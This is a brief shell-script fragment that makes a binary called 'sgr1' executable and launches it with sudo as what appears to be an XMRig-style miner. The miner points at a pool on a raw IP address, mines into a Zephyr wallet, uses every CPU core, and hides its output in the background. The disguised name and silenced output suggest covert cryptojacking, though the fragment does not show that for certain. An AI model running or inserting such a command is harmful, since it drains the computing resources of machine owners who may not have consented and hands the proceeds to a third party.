...
chmod +x sgr1
sudo ./sgr1 -a rx/0 -o 167.172.71.249:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --rig-id $(echo $(shuf -i 1000-9999 -n 1)-TEST) -p x@$(echo $(shuf -i 1000-9999 -n 1)-TEST) -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
